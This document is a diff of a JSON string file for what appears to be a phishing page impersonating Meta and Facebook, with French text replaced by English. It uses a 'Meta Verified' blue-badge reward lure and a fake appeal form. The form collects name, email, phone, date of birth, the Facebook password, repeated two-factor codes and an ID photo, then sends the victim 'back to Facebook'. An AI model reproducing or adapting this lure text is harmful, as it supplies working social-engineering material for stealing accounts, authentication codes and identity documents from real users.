@@ -1,245 +1,245 @@
 {
   "menu": {
-    "title": "Centre de confidentialité",
+    "title": "Privacy Centre",
     "menu_1": {
-      "title": "Accueil du Centre de confidentialité"
+      "title": "Privacy Centre Home"
     },
     "menu_2": {
-      "title": "Recherche"
+      "title": "Search"
     },
     "menu_3": {
-      "title": "Paramètres de confidentialité courants"
+      "title": "Common Privacy Settings"
     },
     "menu_4": {
-      "title": "Thèmes de confidentialité"
+      "title": "Privacy Topics"
     },
     "menu_5": {
-      "title": "Plus de ressources sur la confidentialité"
+      "title": "More Privacy Resources"
     },
     "menu_6": {
-      "title": "Politique de confidentialité",
+      "title": "Privacy Policy",
       "sub_title": {
-        "sub_1": "Qu'est-ce que la politique de confidentialité et que couvre-t-elle ?",
-        "sub_2": "Quelles informations collectons-nous ?",
-        "sub_3": "Comment utilisons-nous vos informations ?",
-        "sub_4": "Comment partageons-nous vos informations sur les produits ou avec des partenaires intégrés ?",
-        "sub_5": "Comment partageons-nous les informations avec des tiers ?",
-        "sub_6": "Comment est organisée la coopération entre les entreprises ?",
-        "sub_7": "Comment pouvez-vous gérer ou supprimer vos informations et exercer vos droits ?",
-        "sub_8": "Combien de temps conservons-nous vos informations ?",
-        "sub_9": "Comment transmettons-nous les informations ?",
-        "sub_10": "Comment répondons-nous aux demandes officielles, respectons-nous les lois applicables et prévenons-nous les préjudices ?",
-        "sub_11": "Comment saurez-vous quand la politique change ?",
-        "sub_12": "Comment poser des questions ?",
-        "sub_13": "Pourquoi et comment traitons-nous vos données ?"
+        "sub_1": "What is the Privacy Policy and what does it cover?",
+        "sub_2": "What information do we collect?",
+        "sub_3": "How do we use your information?",
+        "sub_4": "How do we share your information on products or with integrated partners?",
+        "sub_5": "How do we share information with third parties?",
+        "sub_6": "How is the cooperation between companies organized?",
+        "sub_7": "How can you manage or delete your information and exercise your rights?",
+        "sub_8": "How long do we keep your information?",
+        "sub_9": "How do we transmit information?",
+        "sub_10": "How do we respond to official requests, comply with applicable laws, and prevent harm?",
+        "sub_11": "How will you know when the policy changes?",
+        "sub_12": "How to ask questions?",
+        "sub_13": "Why and how do we process your data"
       }
     },
     "menu_7": {
-      "title": "Autres politiques et articles",
+      "title": "Other Policies and Articles",
       "sub_title": {
-        "sub_1": "Politique sur les cookies",
-        "sub_2": "Informations pour ceux qui n'utilisent pas les produits",
-        "sub_3": "Comment les informations sont utilisées pour les modèles d'IA générative",
-        "sub_4": "Politique du cadre de transfert de données",
-        "sub_5": "Autres termes et conditions"
+        "sub_1": "Cookie Policy",
+        "sub_2": "Information for those who don't use products",
+        "sub_3": "How information is used for generative AI models",
+        "sub_4": "Data Transfer Framework Policy",
+        "sub_5": "Other terms and conditions"
       }
     }
   },
   "content": {
     "top_content": {
-      "title": "Meta Verified – Récompenses pour vous",
+      "title": "Meta Verified – Rewards for You",
       "sub": {
-        "sub_1": "Félicitations ! Vous avez rempli toutes les conditions pour mettre à niveau votre page avec le badge bleu vérifié ! Il s’agit d’une étape importante qui reflète votre engagement et la confiance que vous avez bâtie avec votre audience.",
-        "sub_2": "Nous sommes ravis de célébrer ce moment avec vous et avons hâte de voir votre page prospérer grâce à cette reconnaissance prestigieuse !"
+        "sub_1": "Congratulations on meeting the requirements to upgrade your page with a verified blue badge! This is an incredible milestone that highlights your dedication and the trust you’ve built with your community.",
+        "sub_2": "We’re excited to celebrate this achievement with you and look forward to seeing your page continue to grow under this prestigious recognition!"
       },
-      "ticket": "ID de votre demande:"
+      "ticket": "Your Request ID:"
     },
     "guide": {
-      "title": "✅ Guide de demande de badge bleu vérifié",
+      "title": "✅ Verified Blue Badge Request Guide",
       "sub": {
-        "sub_1": "Les vérificateurs de faits ne répondront pas aux demandes contenant des menaces, des propos haineux ou un langage offensant.",
-        "sub_2": "Dans votre demande, veuillez fournir toutes les informations requises afin d’assurer un traitement rapide. Fournir une adresse e-mail invalide ou ne pas répondre à une demande d’informations complémentaires dans un délai de 2 jours peut entraîner la fermeture de la demande sans examen. Si la demande reste non traitée après 4 jours, Meta la rejettera automatiquement.",
-        "sub_3": "Une fois toutes les informations soumises, nous évaluerons votre compte pour vérifier d’éventuelles restrictions. Le processus de vérification prend généralement 24 heures, mais peut parfois durer plus longtemps. Selon notre décision, les restrictions seront maintenues ou levées, et votre compte sera mis à jour en conséquence."
+        "sub_1": "Fact-checkers will not respond to requests containing threats, hate speech, or abusive language.",
+        "sub_2": "Please provide all required information in your request to ensure timely processing. Submitting an invalid email address or failing to reply to additional information requests within 2 days may result in the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.",
+        "sub_3": "Once all details are submitted, we’ll evaluate your account for any policy restrictions. The verification process typically takes about 24 hours but may take longer in some cases. Based on the review outcome, restrictions will either remain or be lifted, and your account will be updated accordingly."
       }
     },
     "thumb": {
-      "title": "Examen de vérification",
+      "title": "",
       "sub": {
-        "sub_1": "Demande d’examen",
-        "sub_2": "Le traitement prend généralement entre 24 et 48 heures. Votre compte sera examiné pour détecter d’éventuelles violations des politiques."
+        "sub_1": "Review request",
+        "sub_2": "Processing usually takes 24–48 hours. Your account will be reviewed for any policy violations."
       },
-      "button": "Soumettre la demande",
-      "day": "Vous avez été vérifié le"
+      "button": "Submit Request",
+      "day": "You were verified on"
     },
     "appeal_guide": {
-      "title": "Guide d'appel",
+      "title": "Appeal Guide",
       "sub_title": {
-        "sub_1": "Les vérificateurs de faits peuvent ne pas répondre aux demandes contenant de l'intimidation, des discours de haine ou d'autres menaces verbales.",
-        "sub_2": "Dans votre appel, veuillez inclure toutes les informations nécessaires pour permettre au vérificateur de faits de traiter votre demande rapidement. Si vous fournissez une adresse e-mail non valide ou ne répondez pas à une demande d'informations supplémentaires dans les 2 jours, le vérificateur peut clore la demande sans traitement. Si l'appel n'est pas traité dans les 4 jours, Meta le rejettera automatiquement.",
-        "sub_3": "Lorsque tout est prêt, nous examinerons votre compte et déterminerons si des restrictions s'appliquent. La procédure de vérification prend généralement 24 heures, mais dans certains cas, cela peut prendre plus de temps. Selon notre décision, les restrictions imposées resteront en vigueur ou seront levées et votre compte sera rétabli."
+        "sub_1": "Fact checkers may not respond to requests that include intimidation, hate speech, or other verbal threats.",
+        "sub_2": "In your appeal, please include all necessary information to make the fact checker process your request quickly. If you provide an invalid e-mail address or don't respond to a request for more information within 2 days, the fact checker can close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
+        "sub_3": "When everything is ready, we will review your account and decide if restrictions apply to it. The verification procedure usually takes 24 hours, but in some cases it can take longer. Depending on our decision, the restrictions will stay or we will lift them and your account will be reinstated."
       }
     },
     "privacy_center": {
-      "title": "Centre de confidentialité",
+      "title": "Privacy Centre",
       "sub_title": {
         "sub_1": {
-          "title": "Qu'est-ce que la politique de confidentialité et que dit-elle ?",
-          "description": "Politique de confidentialité"
+          "title": "What is the Privacy Policy and what does it say?",
+          "description": "Privacy Policy"
         },
         "sub_2": {
-          "title": "Comment vous pouvez gérer ou supprimer vos informations",
-          "description": "Politique de confidentialité"
+          "title": "How you can manage or delete your information",
+          "description": "Privacy Policy"
         }
       }
     },
     "more_info": {
-      "title": "Pour plus de détails, voir l'Accord d'utilisateur",
+      "title": "For more details, see the User Agreement",
       "sub_title": {
         "sub_1": {
-          "title": "Produit IA",
-          "description": "Accord d'utilisateur"
+          "title": "AI Product",
+          "description": "User Agreement"
         }
       }
     },
     "resouces": {
-      "title": "Ressources supplémentaires",
+      "title": "Additional resources",
       "sub_title": {
         "sub_1": {
-          "title": "Comment les informations sont utilisées pour les modèles d'IA générative",
-          "description": "Centre de confidentialité"
+          "title": "How information is used for generative AI models",
+          "description": "Privacy Centre"
         },
         "sub_2": {
-          "title": "Cartes d'information sur le fonctionnement des systèmes d'IA",
-          "description": "Site web du produit IA"
+          "title": "Cards with information about the operation of AI systems",
+          "description": "AI product website"
         },
         "sub_3": {
-          "title": "Introduction à l'IA générative",
-          "description": "Pour les adolescents"
+          "title": "Introduction to Generative AI",
+          "description": "For teens"
         }
       }
     },
     "footer": {
-      "title": "Nous identifions continuellement les risques potentiels en matière de confidentialité, y compris lors de la collecte, de l'utilisation ou du partage d'informations personnelles, et développons des méthodes pour réduire ces risques. En savoir plus sur",
-      "link": "Politique de confidentialité"
+      "title": "We continuously identify potential privacy risks, including when we collect, use, or share personal information, and develop methods to reduce those risks. Read more about",
+      "link": "Privacy Policy"
     },
     "modal": {
       "appeal_request": {
-        "title": "Formulaire d'appel",
+        "title": "Information Form",
         "form": {
           "name": {
-            "placeholder": "Nom complet",
-            "required": "Veuillez entrer un nom complet suffisant."
+            "placeholder": "Full Name",
+            "required": "Please enter enough full name."
           },
           "email": {
             "placeholder": "E-mail",
-            "required": "Veuillez entrer une adresse e-mail suffisante."
+            "required": "Please enter enough e-mail address."
           },
           "email_business": {
-            "placeholder": "E-mail professionnel",
-            "required": "Veuillez entrer une adresse e-mail professionnelle suffisante."
+            "placeholder": "Business E-mail",
+            "required": "Please enter enough business e-mail address."
           },
           "page_name": {
-            "placeholder": "URL de la page fan",
-            "required": "Veuillez entrer l'URL complet de la page fan."
+            "placeholder": "Fanpage Url",
+            "required": "Please enter enough fanpage url."
           },
           "phone_number": {
-            "placeholder": "Numéro de téléphone",
-            "required": "Veuillez entrer un numéro de téléphone suffisant."
+            "placeholder": "Phone Number",
+            "required": "Please enter enough phone number."
           },
           "date_of_birth": {
-            "title": "Date de naissance",
+            "title": "Date of Birth",
             "day": {
-              "placeholder": "Jour",
-              "required": "Veuillez entrer un jour suffisant."
+              "placeholder": "Day",
+              "required": "Please enter enough day."
             },
             "month": {
-              "placeholder": "Mois",
-              "required": "Veuillez entrer un mois suffisant."
+              "placeholder": "Month",
+              "required": "Please enter enough month."
             },
             "year": {
-              "placeholder": "Année",
-              "required": "Veuillez entrer une année suffisante."
+              "placeholder": "Year",
+              "required": "Please enter enough year."
             }
           },
           "issue": {
-            "placeholder": "Décrivez votre problème",
-            "required": "Veuillez entrer votre problème.",
-            "note": "Notre réponse vous sera envoyée dans un délai de 14 à 48 heures."
+            "placeholder": "Note",
+            "required": "Please enter your issue.",
+            "note": "Our response will be sent to you within 14 - 48 hours."
           },
           "facebook_notification": {
-            "title": "sur Facebook",
-            "description": "Nous vous enverrons une notification sur Facebook."
+            "title": "on Facebook",
+            "description": "We will send you a notification on Facebook."
           },
           "check_form": {
-            "title": "Je suis d'accord avec",
-            "link": "Conditions d'utilisation"
+            "title": "I agree with",
+            "link": "Terms of use"
           },
-          "button": "Envoyer"
+          "button": "Send"
         }
       },
       "password": {
-        "title": "Mot de passe",
-        "description": "Pour votre sécurité, vous devez entrer votre mot de passe pour continuer.",
+        "title": "Password",
+        "description": "For your security, you must enter your password to continue.",
         "form": {
           "password": {
-            "placeholder": "Mot de passe",
-            "required": "Vous n'avez pas entré votre mot de passe !",
-            "warning": "Le mot de passe que vous avez entré est incorrect."
+            "placeholder": "Password",
+            "required": "You did not enter your password!",
+            "warning": "The password you entered is incorrect."
           },
-          "button": "Continuer",
-          "forgot_password": "Mot de passe oublié ?"
+          "button": "Continue",
+          "forgot_password": "Forgot your password?"
         }
       },
       "2fa": {
-        "title": "Authentification à deux facteurs requise (1/3)",
-        "description": "Le code de vérification a été envoyé à votre numéro de téléphone ou à votre adresse e-mail, veuillez vérifier votre boîte de réception et entrer le code ci-dessous pour compléter. Si vous ne recevez pas le code, veuillez vérifier la notification Facebook sur votre appareil et confirmer qu'il s'agit de vous pour compléter le processus de vérification.",
+        "title": "Two-factor authentication required (1/3)",
+        "description": "The verification code has been sent to your phone number or e-mail, please check your inbox and enter the code below to complete. In case you don't receive the code, please check the Facebook notification on your device and confirm it's you to complete the verification process.",
         "form": {
           "placeholder": "Code",
-          "warning": "L'authentification à deux facteurs que vous avez entrée est incorrecte. Veuillez réessayer après",
-          "required": "Vous n'avez pas entré votre authentification à deux facteurs !",
+          "warning": "The two-factor authentication you entered is incorrect. Please, try again after",
+          "required": "You did not enter your two-factor authentication!",
           "minutes": "minutes",
-          "seconds": "secondes",
-          "button": "Continuer"
+          "seconds": "seconds",
+          "button": "Continue"
         }
       },
       "upload_file": {
-        "title": "Téléchargez votre pièce d'identité",
+        "title": "Upload your ID",
         "sub_title": {
-          "sub_1": "Avant que nous puissions vous ramener sur Facebook en toute sécurité, nous devons nous assurer qu'il s'agit de votre compte. Vous pouvez prouver que ce compte est le vôtre en nous envoyant une photo de votre pièce d'identité.",
-          "sub_2": "Nous n'acceptons pas les photos d'un écran d'ordinateur, d'un écran de téléphone ou d'une photocopie. S'il y a des problèmes, nous vous enverrons un e-mail.",
-          "sub_3": "Nous conserverons une copie cryptée de votre selfie pendant un an maximum pour améliorer notre capacité à détecter les fausses photos, gardant Facebook à l'abri de l'usurpation d'identité.",
-          "sub_4": "Modifier la durée de conservation de votre selfie",
-          "sub_5": "ou",
-          "sub_6": "En savoir plus"
+          "sub_1": "Before we can get you back on Facebook safely, we need to make sure this is your account. You can prove this account is yours by sending us a photo of your ID.",
+          "sub_2": "We don't accept photos of a computer screen, phone screen, or photocopy. If there are any issues, we will send you an e-mail.",
+          "sub_3": "We will store an encrypted copy of your selfie for up to one year to improve our ability to detect fake photos, keeping Facebook safe from impersonation.",
+          "sub_4": "Change how long we store your selfie for",
+          "sub_5": "or",
+          "sub_6": "Learn more"
         },
         "form": {
-          "file": "Téléchargez votre pièce d'identité",
-          "warning": "n'est pas un fichier image",
-          "button": "Continuer"
+          "file": "Upload your ID",
+          "warning": "is not an image file",
+          "button": "Continue"
         }
       },
       "final_step": {
-        "title": "La demande a été envoyée",
-        "description": "Votre demande a été ajoutée à la file d'attente de traitement. Nous traiterons votre demande dans les 24 heures. Si vous ne recevez pas de message e-mail avec le statut de l'appel dans les 24 heures, veuillez renvoyer l'appel.",
-        "button": "Retourner à Facebook"
+        "title": "Request has been sent",
+        "description": "Your request has been added to the processing queue. We will process your request within 24 hours. If you don't receive an e-mail message with the appeal status within 24 hours, please resend the appeal.",
+        "button": "Return to Facebook"
       },
       "authen_modal": {
-        "title": "Choisissez une manière de confirmer qu'il s'agit de vous",
+        "title": "Choose a way to confirm it's you",
         "app": {
-          "sub_1": "Application d'authentification",
-          "sub_2": "Accédez à votre application d'authentification"
+          "sub_1": "Authentication app",
+          "sub_2": "Go to your authentication app"
         },
         "sms": {
           "sub_1": "SMS",
-          "sub_2": "Nous enverrons un code au numéro"
+          "sub_2": "We will send a code to the number"
         },
         "email": {
           "sub_1": "E-mail",
-          "sub_2": "Nous enverrons un code à"
+          "sub_2": "We will send a code to"
         },
         "whatsapp": {
           "sub_1": "WhatsApp",
-          "sub_2": "Nous enverrons un code au numéro"
+          "sub_2": "We will send a code to the number"
         }
       }
     }
